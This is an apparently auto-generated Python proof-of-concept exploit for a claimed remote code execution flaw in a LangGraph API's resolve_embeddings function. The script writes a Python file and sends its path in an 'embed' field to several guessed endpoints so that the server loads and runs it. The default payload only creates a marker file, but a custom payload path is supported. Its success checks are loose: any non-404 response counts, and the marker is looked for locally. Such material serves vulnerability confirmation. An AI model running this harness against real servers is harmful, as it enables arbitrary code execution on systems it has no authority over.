#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-029
# Sink: resolve_embeddings
# Auto-generated — run with: python3 rce_extracts_embed_key_if_resolve_embeddings.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src's resolve_embeddings function.

Vulnerability: The function accepts an 'embed' string from external callers via the
index_config dictionary. If the string contains '.py:', it splits on ':' and uses the
left part as a module path. If the path contains '/', it loads the file using
importlib.util.spec_from_file_location and executes the module. An attacker can
control the 'embed' string to load and execute arbitrary Python files, leading to RCE.

This PoC demonstrates the vulnerability by creating a benign payload file and
triggering its execution through the vulnerable API endpoint.
"""

import os
import sys
import tempfile
import json
import requests
import argparse

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8123"

# Benign payload that creates a marker file to prove code execution
PAYLOAD_CODE = '''
import os
# Create a marker file to prove code execution
os.system("touch /tmp/poc_success.txt")
print("POC: Code execution successful!")
'''

def create_payload_file():
    """Create a temporary Python file with benign payload code."""
    # Create a temporary directory for our payload
    temp_dir = tempfile.mkdtemp(prefix="poc_")
    payload_path = os.path.join(temp_dir, "evil_embed.py")
    
    with open(payload_path, "w") as f:
        f.write(PAYLOAD_CODE)
    
    print(f"[+] Created payload file at: {payload_path}")
    print(f"[+] Payload will create marker file: /tmp/poc_success.txt")
    return payload_path

def trigger_exploit(target_url, payload_path):
    """
    Trigger the vulnerability by sending a crafted request to the API.
    
    The vulnerable function expects an 'index_config' dictionary with an 'embed' key.
    We set the embed value to our payload file path with a function name.
    """
    # The embed string format: <path_to_py_file>:<function_name>
    # We use a dummy function name since our payload executes on import
    embed_string = f"{payload_path}:main"
    
    # Construct the request payload
    # The exact API endpoint may vary - we try common patterns
    payload = {
        "index_config": {
            "embed": embed_string
        }
    }
    
    # Try different possible API endpoints
    endpoints = [
        "/api/embeddings",
        "/api/graph/embeddings",
        "/api/v1/embeddings",
        "/api/langgraph/embeddings",
    ]
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"\n[*] Trying endpoint: {url}")
        
        try:
            response = requests.post(
                url,
                json=payload,
                headers=headers,
                timeout=10
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
            # Check if we got a response (even an error means code executed)
            if response.status_code != 404:
                print(f"[+] Got non-404 response from {url}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection refused to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def verify_exploit():
    """Check if the marker file was created, proving code execution."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"\n[+] SUCCESS! Marker file exists: {marker_file}")
        print("[+] Code execution confirmed!")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print(f"\n[-] Marker file not found at {marker_file}")
        print("[-] Code execution may not have occurred")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src resolve_embeddings"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload",
        help="Path to custom payload file (optional)"
    )
    
    args = parser.parse_args()
    
    print("[*] LangGraph API RCE PoC")
    print("[*] =====================")
    print(f"[*] Target: {args.target}")
    
    # Create or use payload file
    if args.payload:
        payload_path = args.payload
        print(f"[*] Using custom payload: {payload_path}")
    else:
        payload_path = create_payload_file()
    
    # Trigger the exploit
    print("\n[*] Attempting to trigger vulnerability...")
    triggered = trigger_exploit(args.target, payload_path)
    
    # Verify code execution
    print("\n[*] Checking for code execution evidence...")
    success = verify_exploit()
    
    # Cleanup
    if not args.payload:
        try:
            os.remove(payload_path)
            os.rmdir(os.path.dirname(payload_path))
            print(f"[*] Cleaned up temporary payload file")
        except:
            pass
    
    if success:
        print("\n[+] VULNERABILITY CONFIRMED: Remote Code Execution achieved!")
        sys.exit(0)
    else:
        print("\n[-] Could not confirm code execution")
        print("[*] Possible reasons:")
        print("  - Target is not running the vulnerable version")
        print("  - API endpoint is different")
        print("  - Authentication/authorization required")
        print("  - Network connectivity issues")
        sys.exit(1)

if __name__ == "__main__":
    main()
